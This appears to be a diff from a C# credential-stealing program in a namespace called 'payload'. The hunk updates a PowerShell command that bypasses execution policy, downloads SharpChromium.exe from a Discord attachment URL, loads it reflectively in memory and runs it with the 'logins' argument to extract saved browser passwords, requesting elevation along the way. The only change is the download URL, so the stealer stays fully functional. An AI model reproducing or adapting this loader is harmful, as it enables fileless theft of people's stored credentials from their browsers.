@@ -240,7 +240,7 @@ namespace payload
                             StartInfo = new ProcessStartInfo()
                             {
                                 FileName = "powershell.exe",
-                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/966980162497445888/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
+                                Arguments = "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/966985823138496542/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))",
                                 UseShellExecute = false,
                                 RedirectStandardOutput = true,
                                 Verb = "runas"
